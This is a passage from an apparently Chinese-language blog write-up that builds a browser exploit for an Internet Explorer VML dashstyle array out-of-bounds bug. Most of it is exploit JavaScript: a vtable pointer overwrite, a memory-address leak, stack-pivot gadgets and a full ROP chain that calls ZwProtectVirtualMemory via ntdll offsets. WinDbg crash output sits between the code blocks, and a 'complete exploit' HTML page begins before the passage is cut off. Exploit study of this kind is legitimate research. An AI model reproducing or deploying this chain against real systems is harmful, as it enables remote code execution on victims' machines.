class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._anchorRect;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x300</span>)&#123;</span><br><span class="line">            vml1.dashstyle = <span class="string">"1 2 3 4"</span>; <span class="comment">//与COAReturnedPointsForAnchor对象大小保持一致</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">    vml1.dashstyle.array.item(<span class="number">6</span>) = <span class="number">0x41414141</span>;    <span class="comment">//覆盖虚表指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> a[i];</span><br><span class="line">        CollectGarbage();</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试笔记-1"><a href="#调试笔记-1" class="headerlink" title="调试笔记"></a>调试笔记</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">(fa4.a14): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=06f8a6b0 ebx=01f12460 ecx=41414141 edx=0000008a esi=01f12460 edi=00000009</span><br><span class="line">eip=76494974 esp=0247ef14 ebp=0247ef20 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">OLEAUT32!VariantClear+0xb6:</span><br><span class="line">76494974 ff5108          call    dword ptr [ecx+8]    ds:0023:41414149=????????</span><br><span class="line">0:005&gt; dd eax-20</span><br><span class="line">06f8a690  6cc5ecf8 8800c248 00000001 00000002</span><br><span class="line">06f8a6a0  00000003 00000004 6cc5ecff 88000194</span><br><span class="line">06f8a6b0  41414141 06f3d9d0 00000001 00000000</span><br><span class="line">06f8a6c0  6cc5ecf2 88008cd5 6e895504 06f3dab0</span><br><span class="line">06f8a6d0  00000001 00000000 6cc5ecf1 8800c1b4</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>因为我们拥有获取字符串地址的能力，所以这里不需要使用堆喷技术。<br>将<code>shellcode</code>作为<code>marginLeft</code>的值，即可通过读取<code>marginLeft指针</code>泄露出它的地址。<br>然后根据泄露出来的地址生成rop链，同样的方法将生成的<code>rop链</code>写入<code>marginLefe</code>并泄露出地址。最后劫持eip到rop链上</p><h3 id="布置payload"><a href="#布置payload" class="headerlink" title="布置payload"></a>布置payload</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;	</span><br><span class="line">    <span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._vgRuntimeStyle;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        a[i].rotation;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;</span><br><span class="line">        vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span><br><span class="line">    vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;  </span><br><span class="line">        marginLeftAddress_orgin = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);   </span><br><span class="line">        a[i].marginLeft = <span class="built_in">unescape</span>(<span class="string">"shellcode"</span>);</span><br><span class="line">        marginLeftAddress_modify = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (marginLeftAddress_orgin != marginLeftAddress_modify) &#123;</span><br><span class="line">            vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = <span class="number">0x7ffe0300</span>;</span><br><span class="line">            <span class="keyword">var</span> leak = a[i].marginLeft;</span><br><span class="line">            vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = marginLeftAddress_orgin;</span><br><span class="line">            <span class="comment">//第一次泄露</span></span><br><span class="line">            <span class="keyword">var</span> shelladdr = marginLeftAddress_modify;</span><br><span class="line">            ntdllbase = <span class="built_in">parseInt</span>(leak.charCodeAt(<span class="number">1</span>).toString(<span class="number">16</span>) + leak.charCodeAt(<span class="number">0</span>).toString(<span class="number">16</span>), <span class="number">16</span>) - <span class="number">0x464F0</span>;</span><br><span class="line">            alert(<span class="string">"ntdllbase: 0x"</span> + ntdllbase.toString(<span class="number">16</span>));</span><br><span class="line">            alert(<span class="string">"shelladdr: 0x"</span> + shelladdr.toString(<span class="number">16</span>));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//根据shellcode的地址生成rop链</span></span><br><span class="line">            <span class="comment">//第二次泄露</span></span><br><span class="line">            <span class="keyword">var</span> rop_chain = tab2uni(get_ropchain(shelladdr));</span><br><span class="line">            a[i].marginLeft = rop_chain;</span><br><span class="line">            rop_addr = vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>);</span><br><span class="line"></span><br><span class="line">            vml1.dashstyle.array.item(<span class="number">0x2E</span>+<span class="number">0x16</span>) = marginLeftAddress_orgin;</span><br><span class="line">            vml1.dashstyle.array.length = length_orig;		</span><br><span class="line"></span><br><span class="line">            alert(<span class="string">"ropaddr: 0x"</span> + rop_addr.toString(<span class="number">16</span>));</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="栈转移"><a href="#栈转移" class="headerlink" title="栈转移"></a>栈转移</h3><p>前面<code>劫持eip部分</code>可以看到，最后的调用是<code>call dword ptr [ecx+8]</code><br>而在我们的gadget中没有<code>xchg ecx,esp</code>，所以这意味着没办法直接将栈转移到我们的rop链上。<br>但是我们可以通过越界访问，先在<code>COAReturnedPointsForAnchor</code>对象所在堆上布置好一些gadget<br>然后利用<code>xchg eax,esp; pop;</code>这种gadget，让esp先转移到堆上，然后由堆上的gadget再将栈转移到我们的rop链上。</p><h4 id="相关代码-2"><a href="#相关代码-2" class="headerlink" title="相关代码"></a>相关代码</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pivot = [</span><br><span class="line">    ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001cecb</span>),	<span class="comment">//# RETN</span></span><br><span class="line">    ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),	<span class="comment">//# POP EBX # RETN</span></span><br><span class="line">    ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00046B13</span>),	<span class="comment">//# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)&#123;</span><br><span class="line">        a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._anchorRect;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0x300</span>)&#123;</span><br><span class="line">            vml1.dashstyle = <span class="string">"1 2 3 4"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> length_orig = vml1.dashstyle.array.length;</span><br><span class="line">    vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">    vml1.dashstyle.array.item(<span class="number">6</span>) = rop_addr;</span><br><span class="line">    <span class="comment">//在堆上布置gadget</span></span><br><span class="line">    vml1.dashstyle.array.item(<span class="number">8</span>) = rop_addr;    <span class="comment">//rop_addr -&gt; ebx</span></span><br><span class="line">    vml1.dashstyle.array.item(<span class="number">9</span>) = ntdllbase + <span class="number">0x000cb0f8</span>;	<span class="comment">//# MOV ESP,EBX # POP EBX # RETN</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">delete</span> a[i];</span><br><span class="line">        CollectGarbage();</span><br><span class="line">    &#125;</span><br><span class="line">    alert(<span class="string">"done"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><ol><li>由<code>call dword ptr [ecx+8]</code>可以知道，首先执行的是rop第三句<ol><li>交换<code>eax</code>和<code>esp</code>，栈被转移到堆上，<code>esp</code>指向<code>vml1.dashstyle.array.item(6)</code></li><li><code>pop esi; pop edi</code>，<code>esp</code>移动到<code>vml1.dashstyle.array.item(8)</code></li><li><code>pop ebx</code>，将<code>vml1.dashstyle.array.item(8)</code>中的值存入ebx，即<code>rop_addr -&gt; ebx</code></li><li><code>retn</code>，程序返回到<code>esp</code>指向的<code>vml1.dashstyle.array.item(9)</code></li></ol></li><li>执行布置在堆上的gadget<ol><li><code>mov esp,ebx</code>，因为<code>ebx</code>中使rop链的地址，栈被成功转移到rop链上。</li><li><code>pop ebx</code>，<code>esp</code>指向rop链第二句</li></ol></li><li>执行rop链第二句，<code>POP EBX</code>，将第三句弹出，防止再次栈转移</li></ol><h3 id="rop链"><a href="#rop链" class="headerlink" title="rop链"></a>rop链</h3><p>这里我们主要利用ntdll.dll中的<code>ntdll!ZwProtectVirtualMemory函数</code>来修改内存的属性。<br>要求的寄存器环境为<br></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edi -&gt; ZwProtectVirtualMemory</span><br><span class="line">esi -&gt; return_address</span><br><span class="line">ebp -&gt; <span class="number">0xffffffff</span></span><br><span class="line">esp -&gt; ptr to BaseAddress</span><br><span class="line">ebx -&gt; ptr to NumberOfBytesToProtect</span><br><span class="line">edx -&gt; <span class="number">0x00000040</span></span><br><span class="line">ecx -&gt; ptr to OldAccessProtection</span><br></pre></td></tr></table></figure><p></p><p>这里<code>ptr to OldAccessProtection</code>可以是任意可写地址，将被用来存放以前的保护属性。<br>我们注意到，其中还存在另外2个指针数据，所以这就要求我们先将数据存储到内存中，再将其地址取出来。<br>所以这里我选择先将数据存储到ntdll.dll的<code>data</code>段，因为这里具有固定的偏移<code>0xD7000</code>，且内存可写。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !dh ntdll</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">SECTION HEADER #1</span><br><span class="line">   .text name</span><br><span class="line">        ...</span><br><span class="line">         Execute Read</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">SECTION HEADER #2</span><br><span class="line">      RT name</span><br><span class="line">        ...</span><br><span class="line">         Execute Read</span><br><span class="line"></span><br><span class="line">SECTION HEADER #3</span><br><span class="line">   .data name</span><br><span class="line">    806C virtual size</span><br><span class="line">   D7000 virtual address</span><br><span class="line">        ...</span><br><span class="line">         Read Write</span><br><span class="line"></span><br><span class="line">SECTION HEADER #4</span><br><span class="line">   .rsrc name</span><br><span class="line">        ...</span><br><span class="line">         Read Only</span><br><span class="line"></span><br><span class="line">SECTION HEADER #5</span><br><span class="line">  .reloc name</span><br><span class="line">        ...</span><br><span class="line">         Read Only</span><br></pre></td></tr></table></figure><p></p><h4 id="相关代码-3"><a href="#相关代码-3" class="headerlink" title="相关代码"></a>相关代码</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ropchain</span>(<span class="params">shelladdr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> data_off = <span class="number">0x000D7000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    <span class="keyword">var</span> arr = [</span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001cecb</span>),	    <span class="comment">//# RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),	    <span class="comment">//# POP EBX # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00046B13</span>),	    <span class="comment">//# XCHG EAX,ESP # POP ESI # POP EDI # LEA EAX,DWORD PTR DS:[EDX-1] # POP EBX # RETN</span></span><br><span class="line"></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),	    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off),	    <span class="comment">//buf1 -&gt; eax</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),	    <span class="comment">//# POP EDX # RETN</span></span><br><span class="line">        <span class="built_in">Number</span>(shelladdr),                  <span class="comment">//BaseAddress-&gt; edx</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),	    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line"></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),	    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x4</span>),   <span class="comment">//buf2 -&gt; eax</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),	    <span class="comment">//# POP EDX # RETN</span></span><br><span class="line">        <span class="number">0x00010400</span>,                         <span class="comment">//NumberOfBytesToProtect -&gt; edx</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),	    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line"></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),	    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off<span class="number">-0x4</span>),   <span class="comment">//buf3 -&gt; eax</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000468e0</span>),	    <span class="comment">//# POP EDX # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000C3C64</span>),	    <span class="comment">//# PUSHAD # RETN </span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000CA46F</span>),	    <span class="comment">//# MOV DWORD PTR DS:[EAX],EDX # POP EBP # RETN</span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line"></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00034b9a</span>),     <span class="comment">//# POP EDI # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00045360</span>),	    <span class="comment">//ZwProtectVirtualMemory -&gt; edi</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0001da87</span>),	    <span class="comment">//# POP EBX # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x4</span>),   <span class="comment">//ptr to NumberOfBytesToProtect -&gt; ebx</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x0006D4F3</span>),	    <span class="comment">//# POP EAX # OR DH,DH # RETN</span></span><br><span class="line">        <span class="number">0x8b37c4da</span>,</span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000576DA</span>),	    <span class="comment">//# ADD EAX,74C83B66 # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00008cbb</span>),	    <span class="comment">//# XCHG EAX,EDX # ADD AL,0 # POP ESI # POP EBP # RETN 0x04 (0x00000040 -&gt; edx)</span></span><br><span class="line">        <span class="built_in">Number</span>(shelladdr),                  <span class="comment">//return address -&gt; esi</span></span><br><span class="line">        <span class="number">0xffffffff</span>,                         <span class="comment">//0xffffffff -&gt; ebp</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x000614e8</span>),	    <span class="comment">//# POP ECX # RETN</span></span><br><span class="line">        <span class="number">0x90909090</span>, </span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off+<span class="number">0x8</span>),   <span class="comment">//ptr to OldAccessProtection -&gt; ecx</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(<span class="number">0x00037B20</span>),     <span class="comment">//# POP ESP # RETN</span></span><br><span class="line">        ntdllbase + <span class="built_in">Number</span>(data_off<span class="number">-0x4</span>),   <span class="comment">//ptr to BaseAddress -&gt; esp               </span></span><br><span class="line">        <span class="number">0x90909090</span>,</span><br><span class="line">        <span class="number">0x90909090</span></span><br><span class="line">        ];</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><ul><li>前三句是<code>栈转移</code>代码</li><li>通过<code>MOV DWORD PTR DS:[EAX],EDX</code>，分别将<code>BaseAddress</code>、<code>NumberOfBytesToProtect</code>写入到<code>buf1</code>和<code>buf2</code></li><li><code>buf3</code>中存储的是指令<code>PUSHAD; RETN</code>的地址，因为在<code>rop</code>最后我们会将<code>buf3</code>的地址写入<code>esp</code>，导致栈转移到<code>buf</code>中。</li><li>因为不能出现<code>0x0000</code>这种数据，所以在将<code>0x00000040</code>写入<code>edx</code>时需要做一些处理。这里先将<code>0x8b37c4da</code>写入<code>eax</code>，然后将<code>eax</code>加上<code>0x74C83B66</code>，数据溢出后恰好是<code>0x40</code>，这就避免了<code>0x0000</code>的出现。</li></ul><h1 id="完整利用"><a href="#完整利用" class="headerlink" title="完整利用"></a>完整利用</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-ua-compatible"</span> <span class="attr">content</span>=<span class="string">"IE=EmulateIE9"</span> &gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>hpasserby<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">v\: * &#123; behavior:url(#default#VML); display:inline-block &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">xml:namespace</span> <span class="attr">ns</span>=<span class="string">"urn:schemas-microsoft-com:vml"</span> <span class="attr">prefix</span>=<span class="string">"v"</span> /&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">v:oval</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">v:stroke</span> <span class="attr">id</span>=<span class="string">"vml1"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">v:oval</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span 